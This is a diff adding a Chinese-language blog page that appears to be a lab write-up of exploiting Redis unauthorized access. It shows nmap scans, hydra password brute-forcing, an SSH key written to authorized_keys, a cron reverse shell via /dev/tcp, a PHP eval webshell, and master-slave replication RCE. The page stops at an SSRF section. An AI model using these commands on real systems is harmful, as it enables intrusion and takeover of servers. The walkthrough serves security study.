@@ -1,0 +1,807 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/bg/index.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sanli Ma">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Redis安装去http:&#x2F;&#x2F;download.redis.io&#x2F;releases选择一个版本，建议4.0.8 123456789cd &#x2F;tmpwget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-7.2.4.tar.gztar -zvxf redis-7.2.4.tar.gzmv &#x2F;tmp&#x2F;redis-7.2.4 &#x2F;usr&#x2F;local&#x2F;rediscd &#x2F;usr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis未授权访问漏洞">
+<meta property="og:url" content="http://example.com/2024/05/21/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="stdlibh的个人网站">
+<meta property="og:description" content="Redis安装去http:&#x2F;&#x2F;download.redis.io&#x2F;releases选择一个版本，建议4.0.8 123456789cd &#x2F;tmpwget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-7.2.4.tar.gztar -zvxf redis-7.2.4.tar.gzmv &#x2F;tmp&#x2F;redis-7.2.4 &#x2F;usr&#x2F;local&#x2F;rediscd &#x2F;usr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/courseimage-20240510162400812.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240510163642639.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240510170005022.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240511011752561.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240511015012934.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240511032133259.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240511040341109.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240511040545099.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240511040152924.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240511172423214.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240511173054864.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240512212439121.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240512212826275.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240517233702181.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240517154647351.png">
+<meta property="og:image" content="http://example.com/img/courseInkedimage-20240517163331848.jpg">
+<meta property="og:image" content="http://example.com/img/courseimage-20240518011538733.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240518011655104.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240518012412512.png">
+<meta property="og:image" content="http://example.com/img/courseimage-20240518012247382.png">
+<meta property="article:published_time" content="2024-05-21T11:38:29.000Z">
+<meta property="article:modified_time" content="2024-05-21T11:50:03.611Z">
+<meta property="article:author" content="Sanli Ma">
+<meta property="article:tag" content="数据库">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/courseimage-20240510162400812.png">
+  
+  
+  
+  <title>redis未授权访问漏洞 - stdlibh的个人网站</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="stdlibh的个人网站" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Stdlibh</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg/background.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="redis未授权访问漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-21 19:38" pubdate>
+          2024年5月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          49 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">redis未授权访问漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Redis安装"><a href="#Redis安装" class="headerlink" title="Redis安装"></a>Redis安装</h1><p>去<a target="_blank" rel="noopener" href="http://download.redis.io/releases%E9%80%89%E6%8B%A9%E4%B8%80%E4%B8%AA%E7%89%88%E6%9C%AC%EF%BC%8C%E5%BB%BA%E8%AE%AE4.0.8">http://download.redis.io/releases选择一个版本，建议4.0.8</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /tmp<br>wget http://download.redis.io/releases/redis-7.2.4.tar.gz<br>tar -zvxf redis-7.2.4.tar.gz<br>mv /tmp/redis-7.2.4 /usr/local/redis<br>cd /usr/local/redis<br>make<br>make PREFIX=/usr/local/redis install<br>	<br>./bin/redis-server&amp; ./redis.conf<br></code></pre></td></tr></table></figure>
+
+<h1 id="Redis未授权访问-漏洞复现"><a href="#Redis未授权访问-漏洞复现" class="headerlink" title="Redis未授权访问 漏洞复现"></a>Redis未授权访问 漏洞复现</h1><p><strong>一、漏洞描述</strong></p>
+<p>漏洞成因： </p>
+<p>1.Redis 绑定在默认的 6379 端，且没有配置访问控制策略，直接暴露在公网。攻击者可以通过扫描获 取 Redis 访问端口，从而攻击者未经授权也可以访问 Redis。 </p>
+<p>2.未设置密码或者设置弱密码，允许远程登录访问 Redis 服务。攻击者可以直接或者通过密码爆破连 接到 Redis 并进行恶意操作。</p>
+<ol start="3">
+<li>Redis 使用 root 权限启动。使得攻击者在成功入侵 Redis 服务后，利用 Redis 对服务器开展进一步 的攻击。</li>
+</ol>
+<p><strong>二、漏洞影响版本</strong></p>
+<p>Redis 2.x–5.x</p>
+<p>三、<strong>漏洞危害</strong></p>
+<p>(1) 未授权的访问可能导致敏感信息泄露，攻击者也可以恶意执行命令来清空所有数据和破坏服务</p>
+<p> (2) 如果 Redis 以 root 权限启动，攻击者可以在&#x2F;root&#x2F;.ssh 写入 SSH 公钥文件，直接通过 SSH 登录 目标服务器</p>
+<p> (3) 攻击者可通过 Redis 数据备份功写入可以指定目录的特性，写入后面程序，结合计划任务或者 web 服务 getshell，执行恶意代码和攻击。                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </p>
+<p>当redis服务(6379)端口对外开放且未作密码认证时，任意用户可未授权访问redis服务并操作获取其数据。<br>攻击机：kali 192.168.198.134<br>目标靶机：centos 192.168.198.144</p>
+<h2 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1.端口扫描"></a>1.端口扫描</h2><p>首先在攻击机上使用nmap对目标机进行扫描，探测开放的服务与端口。<br>使用全端口扫描，探测存在的服务： </p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -p- -sV <span class="hljs-number">192.168.198.144</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~/password]                                                                                                                                                               <br>└─$ nmap -p- -sV 192.168.198.144                                                                                                                                                           <br>Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-10 04:18 EDT                                                                                                                            <br>Nmap scan report for 192.168.198.144                                                                                                                                                       <br>Host is up (0.00066s latency).                                                                                                                                                             <br>Not shown: 65532 closed tcp ports (conn-refused)                                                                                                                                           <br>PORT      STATE SERVICE  VERSION                                                                                                                                                           <br>22/tcp    open  ssh      OpenSSH 7.4 (protocol 2.0)                                                                                                                                        <br>6379/tcp  open  redis    Redis key-value store 2.8.17                                                                                                                                      <br>10250/tcp open  ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)                                                                                                         <br>                                                                                                                                                                                           <br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                             <br>Nmap done: 1 IP address (1 host up) scanned in 20.72 seconds    <br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/courseimage-20240510162400812.png" srcset="/img/loading.gif" lazyload alt="image-20240510162400812"></p>
+<h2 id="2-密码爆破"><a href="#2-密码爆破" class="headerlink" title="2.密码爆破"></a>2.密码爆破</h2><p>使用hydra进行密码爆破</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra  <span class="hljs-number">192.168</span>.<span class="hljs-number">198.144</span> redis -P <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/password/</span>top1000.txt -e ns  -f -o redis.txt<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(kali㉿kali)-[~/<span class="hljs-keyword">password</span>]                                                                                                                                                               <br>└─$ hydra  <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span> redis -P /home/kali/<span class="hljs-keyword">password</span>/top1000.txt -e ns  -f -o redis.txt                                                                                                 <br>Hydra v9<span class="hljs-number">.3</span> (c) <span class="hljs-number">2022</span> <span class="hljs-keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> use <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** ignore laws<br> <span class="hljs-keyword">and</span> ethics anyway).                                                                                                                                                                       <br>                                                                                                                                                                                           <br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-10</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>:<span class="hljs-number">21</span>                                                                                                         <br>[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> <span class="hljs-keyword">server</span>, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">1001</span> <span class="hljs-keyword">login</span> tries (l:<span class="hljs-number">1</span>/p:<span class="hljs-number">1001</span>), ~<span class="hljs-number">63</span> tries per task                                                                                      <br>[DATA] attacking redis://<span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span>:<span class="hljs-number">6379</span>/                                                                                                                                             <br>[<span class="hljs-number">6379</span>][redis] host: <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span>   <span class="hljs-keyword">password</span>: foobared                                                                                                                                   <br>[STATUS] attack finished <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span> (<span class="hljs-keyword">valid</span> pair <span class="hljs-built_in">found</span>)                                                                                                                            <br><span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> <span class="hljs-keyword">valid</span> <span class="hljs-keyword">password</span> <span class="hljs-built_in">found</span>                                                                                                                               <br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-10</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>:<span class="hljs-number">23</span>                                                                                                         <br>                                                                                                                                                                                           <br>┌──(kali㉿kali)-[~/<span class="hljs-keyword">password</span>]                                                                                                                                                               <br>└─$ cat redis.txt                                                                                                                                                                          <br>                                                                                                                                                                                           <br># Hydra v9<span class="hljs-number">.3</span> run at <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-10</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>:<span class="hljs-number">21</span> <span class="hljs-keyword">on</span> <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span> redis (hydra -P /home/kali/<span class="hljs-keyword">password</span>/top1000.txt -e ns -f -o redis.txt <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span> redis)                                    <br>[<span class="hljs-number">6379</span>][redis] host: <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span>   <span class="hljs-keyword">password</span>: foobared   <br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/courseimage-20240510163642639.png" srcset="/img/loading.gif" lazyload alt="image-20240510163642639"></p>
+<p>得到密码foobared</p>
+<h2 id="3-远程连接redis"><a href="#3-远程连接redis" class="headerlink" title="3.远程连接redis"></a>3.远程连接redis</h2><p>使用密码连接</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">redis</span>-cli -h <span class="hljs-number">192.168.198.144</span> -p <span class="hljs-number">6379</span> -a foobared<br></code></pre></td></tr></table></figure>
+
+<p>连接成功</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(kali㉿kali)-<span class="hljs-string">[~/password]</span>                                                                                                                                                               <br>└─$ redis-cli -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">198</span>.<span class="hljs-number">144</span> -p <span class="hljs-number">6379</span> -a foobared                                                                                                                                       <br><span class="hljs-number">192.168.198.144:6379</span>&gt;    <br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/courseimage-20240510170005022.png" srcset="/img/loading.gif" lazyload alt="image-20240510170005022"></p>
+<h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><h3 id="（1）写-ssh-keygen-公钥登录服务器"><a href="#（1）写-ssh-keygen-公钥登录服务器" class="headerlink" title="（1）写 ssh-keygen 公钥登录服务器"></a>（1）写 ssh-keygen 公钥登录服务器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>ssh-keygen -t rsa<br><span class="hljs-meta prompt_"># </span><span class="language-bash">接着将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合），再把key.txt文件内容写入服务端Redis的缓冲里：</span><br>(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /root/.ssh/key.txt<br>cat /root/.ssh/key.txt | ./redis-cli  -h 192.168.198.144 -p 6379 -a foobared -x set pub<br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用攻击机连接目标机器Redis，设置Redis的备份路径为/root/.ssh/和保存文件名为authorized_keys，并将数据保存在目标服务器硬盘上</span><br>./redis-cli -h 192.168.198.144 -p 6379 -a foobared<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置工作目录为 /root/.ssh</span><br>config set dir /root/.ssh<br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建文件 authorized_keys</span><br>config set dbfilename &quot;authorized_keys&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">保存信息入文件</span><br>save<br><br>ssh -i  /root/.ssh/id_rsa root@192.168.198.144 <br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/courseimage-20240511011752561.png" srcset="/img/loading.gif" lazyload alt="image-20240511011752561"></p>
+<p><img src="/img/courseimage-20240511015012934.png" srcset="/img/loading.gif" lazyload alt="image-20240511015012934"></p>
+<h3 id="（2）利用-Redis-写入计划任务"><a href="#（2）利用-Redis-写入计划任务" class="headerlink" title="（2）利用 Redis 写入计划任务"></a>（2）利用 Redis 写入计划任务</h3><p>该攻击利用数据库的特性，通过以下步骤实现反弹 Shell：</p>
+<ol>
+<li><strong>数据插入：</strong> 将计划任务的内容作为数据值（value），并使用任意键值（key）将其插入数据库中。</li>
+<li><strong>路径修改：</strong> 修改数据库的默认路径，使其指向目标主机上的计划任务路径。</li>
+<li><strong>数据写入文件：</strong> 将数据库中的数据写入目标主机上的计划任务文件。</li>
+</ol>
+<p>通过以上步骤，攻击者可以在目标主机上成功写入一个计划任务，从而实现反弹 Shell。</p>
+<p>在攻击机kali上开启监听：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">nc</span> <span class="hljs-string">-lvp</span> <span class="hljs-number">51888</span><br></code></pre></td></tr></table></figure>
+
+<p>然后连接服务端的Redis，写入反弹shell的计划任务：</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">./</span>redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-number">192.168</span>.<span class="hljs-number">198.144</span> <span class="hljs-operator">-</span>p <span class="hljs-number">6379</span> <span class="hljs-operator">-</span>a foobared<br><span class="hljs-keyword">set</span> cron <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.198.144/51888 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/var/</span>spool<span class="hljs-operator">/</span>cron<br>config <span class="hljs-keyword">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/courseimage-20240511032133259.png" srcset="/img/loading.gif" lazyload alt="image-20240511032133259"></p>
+<p>经过一分钟以后，在攻击机的nc中成功反弹shell回来。</p>
+<h3 id="（3）网站绝对路径写-webshell"><a href="#（3）网站绝对路径写-webshell" class="headerlink" title="（3）网站绝对路径写 webshell"></a>（3）网站绝对路径写 webshell</h3><p>对目标机器进行信息收集，看看端口是否开放了哪些</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV -p- -T4 <span class="hljs-number">192.168.198.144</span><br>dirb http://192.168.198.144:80   <br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/courseimage-20240511040341109.png" srcset="/img/loading.gif" lazyload alt="image-20240511040341109"></p>
+<p><strong>写入webshell</strong></p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">./redis-cli -h 192.168.198.144 -p 6379 -a foobared//连接redis</span><br><span class="language-xml">config set dir /var/www/html/ </span><br><span class="language-xml">set xxx &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">config set dbfilename shell.php </span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/courseimage-20240511040545099.png" srcset="/img/loading.gif" lazyload alt="image-20240511040545099"></p>
+<p><strong>蚁剑成功连接</strong></p>
+<p><img src="/img/courseimage-20240511040152924.png" srcset="/img/loading.gif" lazyload alt="image-20240511040152924"></p>
+<h3 id="（4）利用Redis主从复制GetShell"><a href="#（4）利用Redis主从复制GetShell" class="headerlink" title="（4）利用Redis主从复制GetShell"></a>（4）利用Redis主从复制GetShell</h3><p>Redis服务器存在一些大型网站采用的漏洞,例如如果使用了一台Redis服务器,且该服务器存在漏洞,攻击者可以远程执行命令导致数据泄露或损坏。图中还提到,Redis服务器集群可以很好地解决该问题,例如主从服务器复制,即使主服务器被攻击,也可以从从服务器进行数据管理和恢复。</p>
+<p>Redis主从复制(Redis Replication)是一种数据复制技术,通过在多台服务器实例之间自动进行数据同步,来实现数据冗余备份、故障恢复以及负载均衡等功能。其基本原理是使用一个主(master)服务器实例和多个从(slave)服务器实例,实现数据的单向复制。主服务器负责数据的写入和读取操作,而从服务器则只负责通过复制主服务器中的数据来实现数据备份,从而达到数据冗余和异地容灾的目的。一旦主服务器出现故障,可以手动或自动进行主从服务器切换,将某一从服务器升级为新的主服务器,从而确保数据服务的可用性。</p>
+<p>因为漏洞存在于4.x、5.x版本中，Redis提供了主从模式。<br>故靶机更换为 centos 192.168.198.147   redis-4.0.8</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">./redis-cli -h <span class="hljs-number">192.168</span>.<span class="hljs-number">198.147</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">6379</span> -<span class="hljs-selector-tag">a</span> foobared<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 redis-rce.py -r 192.168.198.147 -L 192.168.198.134 -f exp.so -a foobared<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">python3 redis-rce.py -r rhost -lhost lhost -f exp.so -a password</span><br></code></pre></td></tr></table></figure>
+
+<p>选择<code>r</code>来获得一个反弹shell</p>
+<p><img src="/img/courseimage-20240511172423214.png" srcset="/img/loading.gif" lazyload alt="image-20240511172423214"></p>
+<p>成功反弹shell，反弹shell很容易导致Redis暴毙</p>
+<p><img src="/img/courseimage-20240511173054864.png" srcset="/img/loading.gif" lazyload alt="image-20240511173054864"></p>
+<h3 id="（5）结合-SSRF-进行利用"><a href="#（5）结合-SSRF-进行利用" class="headerlink" title="（5）结合 SSRF 进行利用"></a>（5）结合 SSRF 进行利用</h3><p>SSRF 攻击的目标是从外网无法访问的内部系统，这里通过 SSRF 使用 dict 协议访问本地 Redis</p>
+<p>构造 Redis 命令写入 webshell</p>
